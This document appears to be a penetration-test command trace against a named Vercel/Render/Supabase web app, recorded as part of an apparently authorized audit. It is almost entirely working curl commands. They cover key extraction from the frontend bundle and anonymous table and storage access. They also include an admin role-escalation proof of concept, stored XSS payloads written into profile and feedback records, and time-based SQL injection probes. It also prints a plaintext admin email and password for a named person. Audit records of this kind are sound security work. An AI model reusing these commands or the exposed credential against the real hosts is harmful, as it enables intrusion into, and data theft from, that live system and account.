# Security Audit Command Trace (Full Method + Commands)

## Scope
- Frontend: `https://pl-conso-frontend.vercel.app/`
- Backend: `https://pl-conso-backend.onrender.com`
- Supabase: `https://kqszoxpiyxmohqobmfog.supabase.co`

This file documents the step-by-step testing approach and the command trail used during the assessment.

## 1. Methodology
1. Passive recon:
- Validate host availability and headers.
- Pull public frontend bundle and extract endpoints/keys.
2. Surface mapping:
- Enumerate Supabase REST/Storage/Auth behavior.
- Enumerate backend routes from OpenAPI.
3. Control validation:
- Auth, access control, storage policy, rate limits.
- SQLi fuzzing and stored-XSS persistence testing.
4. Authenticated extension:
- Use provided admin credentials for authenticated checks.
5. Cleanup:
- Remove/revert test artifacts.

## 2. Command Trail (Chronological)

### 2.1 Frontend baseline
```bash
curl -sSI https://pl-conso-frontend.vercel.app/
curl -sk https://pl-conso-frontend.vercel.app/ | head -n 120
curl -skI https://pl-conso-frontend.vercel.app/assets/index-PvOG8iRw.js
```

### 2.2 Bundle extraction and endpoint discovery
```bash
curl -sk https://pl-conso-frontend.vercel.app/assets/index-PvOG8iRw.js -o /tmp/plconso.js && wc -c /tmp/plconso.js
curl -sk https://pl-conso-frontend.vercel.app/assets/index-PvOG8iRw.js -o /tmp/plconso.js && echo "saved" && rg -n "pl-conso-backend\.onrender\.com|supabase|createClient\(|from\(\"|storage\.from\(|auth\.|localStorage|sessionStorage|access_token|refresh_token|jwt|Authorization|apikey" /tmp/plconso.js | head -n 250 && echo "---URLS---" && rg -o "https?://[^\"\x27\) ]+" /tmp/plconso.js | sort -u | head -n 200
rg -o "sb_publishable_[A-Za-z0-9_-]+" /tmp/plconso.js | head -n 5
rg -o "https://[a-z0-9-]+\.supabase\.co" /tmp/plconso.js | sort -u
```

### 2.3 Supabase anonymous REST checks
```bash
curl -sk -D - "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/runs?select=*&limit=1" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -o /tmp/supa_runs_resp.txt
curl -sk -D - "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/projects?select=*&limit=3" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -o /tmp/supa_projects.json
curl -sk -D - "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/profiles?select=*&limit=3" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -o /tmp/supa_profiles.json
curl -sk -D - "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/user_roles?select=*&limit=5" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -o /tmp/supa_roles.json
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/run_logs?select=run_id,level,message,timestamp&limit=2" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki"
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/run_files?select=run_id,file_type,filename,storage_path&limit=3" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki"
```

### 2.4 Supabase write/permission checks
```bash
curl -sk -D - "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/runs" -X POST -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Content-Type: application/json" -H "Prefer: return=representation" --data "{}" -o /tmp/supa_insert_runs.json
curl -sk -D - "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/runs?id=eq.00000000-0000-0000-0000-000000000000" -X PATCH -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Content-Type: application/json" -H "Prefer: return=representation" --data "{\"status\":\"cancelled\"}" -o /tmp/supa_patch.json
curl -sk -D - "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/runs?id=eq.00000000-0000-0000-0000-000000000000" -X DELETE -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Prefer: return=representation" -o /tmp/run_del.json
```

Table sweep:
```bash
for t in runs run_logs run_files projects sites profiles user_roles feedback; do
  curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/${t}?select=*&limit=1" \
    -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" \
    -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki"
done
```

### 2.5 Storage policy checks
Bucket list:
```bash
for b in input-creation-output input-creation-master input-creation-crawl-team-file input-creation-bussiness-file; do
  curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/list/${b}" \
    -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" \
    -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" \
    -H "Content-Type: application/json" \
    --data '{"prefix":"","limit":1,"offset":0}'
done
```

Object download and probe upload/delete:
```bash
curl -sk -D - "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/input-creation-output/22f3813e.xlsx" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -o /tmp/public_output.xlsx

probe="pentest_probe_$(date +%s).txt"
echo -n "security-test" > /tmp/$probe
curl -sk -X POST "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/input-creation-output/$probe" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "x-upsert: true" -H "Content-Type: text/plain" --data-binary @/tmp/$probe
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/input-creation-output/$probe" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki"
curl -sk -X DELETE "https://kqszoxpiyxmohqobmfog.supabase.co/storage/v1/object/input-creation-output/$probe" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki"
```

### 2.6 Backend unauthenticated checks
```bash
curl -vk --max-time 12 https://pl-conso-backend.onrender.com/ -o /tmp/onrender_body.txt
curl -sk --max-time 20 -D - "https://pl-conso-backend.onrender.com/" -X POST -o /tmp/onrender_test.txt
curl -sk --max-time 20 -D - "https://pl-conso-backend.onrender.com/input-run/11111111-1111-1111-1111-111111111111" -X POST -o /tmp/onrender_test.txt
curl -sk --max-time 20 -D - "https://pl-conso-backend.onrender.com/runs/11111111-1111-1111-1111-111111111111/cancel" -X POST -o /tmp/onrender_test.txt

curl -sk -X POST "https://pl-conso-backend.onrender.com/input-run/11111111-1111-1111-1111-111111111111/rerun"
curl -sk -X POST "https://pl-conso-backend.onrender.com/run/11111111-1111-1111-1111-111111111111/rerun"
curl -sk -X POST "https://pl-conso-backend.onrender.com/pdp-run/11111111-1111-1111-1111-111111111111"
curl -sk -X POST "https://pl-conso-backend.onrender.com/pdp-run/11111111-1111-1111-1111-111111111111/rerun"
curl -sk "https://pl-conso-backend.onrender.com/run/11111111-1111-1111-1111-111111111111/logs"
curl -sk "https://pl-conso-backend.onrender.com/run/11111111-1111-1111-1111-111111111111/ai-report-pdf"
```

Method and CORS checks:
```bash
for m in GET POST PUT DELETE; do curl -sk -X $m "https://pl-conso-backend.onrender.com/input-run/abc"; done
for m in GET POST; do curl -sk -X $m "https://pl-conso-backend.onrender.com/pdp-run/abc"; done
curl -sk -D - -X OPTIONS "https://pl-conso-backend.onrender.com/input-run/123" -H "Origin: https://evil.example" -H "Access-Control-Request-Method: POST"
```

Basic rate-limit check:
```bash
for i in $(seq 1 20); do curl -sk "https://pl-conso-backend.onrender.com/run/11111111-1111-1111-1111-111111111111/logs"; done
```

### 2.7 Auth checks
```bash
for i in $(seq 1 20); do
  curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/auth/v1/token?grant_type=password" \
    -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" \
    -H "Content-Type: application/json" \
    --data '{"email":"nosuchuser@example.com","password":"WrongPass123!"}'
done
```

Signup test users:
```bash
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/auth/v1/signup" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Content-Type: application/json" --data '{"email":"pentest.user.<ts>@merkle.com","password":"P@ssw0rd!2345","data":{"full_name":"Pentest User"}}'
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/auth/v1/signup" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Content-Type: application/json" --data '{"email":"pentest.admin.<ts>@merkle.com","password":"P@ssw0rd!2345","data":{"full_name":"Pentest Admin"}}'
```

Provided-admin login:
```bash
curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/auth/v1/token?grant_type=password" -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" -H "Content-Type: application/json" --data '{"email":"kunal.puri@dentsu.com","password":"Arthavi@1234"}' -o /tmp/login_kunal.json
```

### 2.8 Role escalation PoC and rollback
```bash
curl -sk -X POST "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/user_roles" \
  -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" \
  -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" \
  -H "Content-Type: application/json" -H "Prefer: return=representation" \
  --data '{"user_id":"8663dc1a-8cd2-4068-9b54-c98bb2c4b905","role":"admin"}'

curl -sk -X DELETE "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/user_roles?id=eq.6018e5c2-b8d9-468a-af71-c0ef75edcdc4" \
  -H "apikey: sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" \
  -H "Authorization: Bearer sb_publishable_QvShCyuHNiHF9lxDkR3Y_A_Lffdjqki" \
  -H "Prefer: return=representation"
```

### 2.9 XSS persistence-path tests
Anonymous blocked feedback insert:
```bash
curl -sk -X POST "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/feedback" -H "apikey: ..." -H "Authorization: Bearer ..." -H "Content-Type: application/json" -H "Prefer: return=representation" --data '{"subject":"XSS PoC","message":"<img src=x onerror=alert(1337)>","user_id":"..."}'
```

Profile payload write/revert:
```bash
curl -sk -X PATCH "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/profiles?user_id=eq.8663dc1a-8cd2-4068-9b54-c98bb2c4b905" -H "apikey: ..." -H "Authorization: Bearer ..." -H "Content-Type: application/json" -H "Prefer: return=representation" --data '{"full_name":"<svg/onload=alert(1337)>"}'
curl -sk -X PATCH "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/profiles?user_id=eq.8663dc1a-8cd2-4068-9b54-c98bb2c4b905" -H "apikey: ..." -H "Authorization: Bearer ..." -H "Content-Type: application/json" -H "Prefer: return=representation" --data '{"full_name":"Pentest User"}'
```

Authenticated admin XSS persistence/retrieval and cleanup:
```bash
AT=$(sed -nE 's/.*"access_token":"([^"]+)".*/\\1/p' /tmp/login_kunal.json)
USER_ID=$(sed -nE 's/.*"user":\\{[^}]*"id":"([^"]+)".*/\\1/p' /tmp/login_kunal.json)

curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/user_roles?user_id=eq.$USER_ID&select=role" -H "apikey: ..." -H "Authorization: Bearer $AT"

curl -sk -X POST "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/feedback" -H "apikey: ..." -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -H "Prefer: return=representation" --data "{\"user_id\":\"$USER_ID\",\"subject\":\"XSS Auth Probe\",\"message\":\"<img src=x onerror=alert(42)>\"}"

curl -sk -X PATCH "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/profiles?user_id=eq.$USER_ID" -H "apikey: ..." -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -H "Prefer: return=representation" --data '{"full_name":"<svg/onload=alert(777)>"}'

curl -sk "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/feedback?select=id,user_id,subject,message,created_at&order=created_at.desc&limit=3" -H "apikey: ..." -H "Authorization: Bearer $AT"

curl -sk -X PATCH "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/profiles?user_id=eq.$USER_ID" -H "apikey: ..." -H "Authorization: Bearer $AT" -H "Content-Type: application/json" -H "Prefer: return=representation" --data '{"full_name":"Kunal Puri"}'
curl -sk -X DELETE "https://kqszoxpiyxmohqobmfog.supabase.co/rest/v1/feedback?id=eq.56cc299d-4b56-4cca-9c91-1d00a899c1de" -H "apikey: ..." -H "Authorization: Bearer $AT" -H "Prefer: return=representation"
```

### 2.10 OpenAPI-driven deep SQLi fuzzing
OpenAPI discovery:
```bash
curl -sk https://pl-conso-backend.onrender.com/openapi.json -o /tmp/backend_openapi.json
```

Fuzz script execution:
```bash
bash /tmp/sqli_fuzz.sh
```

Summary extraction:
```bash
awk -F"\\t" 'NR>1{key=$1"\\t"$4; c[key]++} END{for (k in c) print c[k],k}' /tmp/sqli_results.tsv | sort -nr
awk -F"\\t" 'NR>1 && $4==403 {print $1" payload="$3}' /tmp/sqli_results.tsv
awk -F"\\t" 'NR>1 && $4==422 {print $1" payload="$3}' /tmp/sqli_results.tsv
curl -sk -o /tmp/tm.txt -w "payload=abc code=%{http_code} time=%{time_total}\\n" -X POST "https://pl-conso-backend.onrender.com/run/abc"
curl -sk -o /tmp/tm.txt -w "payload=%27%20AND%20SLEEP(5)-- code=%{http_code} time=%{time_total}\\n" -X POST "https://pl-conso-backend.onrender.com/run/%27%20AND%20SLEEP(5)--"
curl -sk -o /tmp/tm2.txt -w "since_id=1 code=%{http_code} time=%{time_total}\\n" "https://pl-conso-backend.onrender.com/run/abc/logs?since_id=1"
curl -sk -o /tmp/tm2.txt -w "since_id=%27%20AND%20SLEEP(5)-- code=%{http_code} time=%{time_total}\\n" "https://pl-conso-backend.onrender.com/run/abc/logs?since_id=%27%20AND%20SLEEP(5)--"
```

## 3. Evidence Artifacts
Primary generated local artifacts:
- `/tmp/plconso.js`
- `/tmp/backend_openapi.json`
- `/tmp/sqli_results.tsv`
- `/tmp/login_kunal.json`
- `/tmp/public_output.xlsx`

Root reports:
- `SECURITY_AUDIT_DETAILED_REPORT.md`
- `SECURITY_AUDIT_COMMAND_TRACE.md`

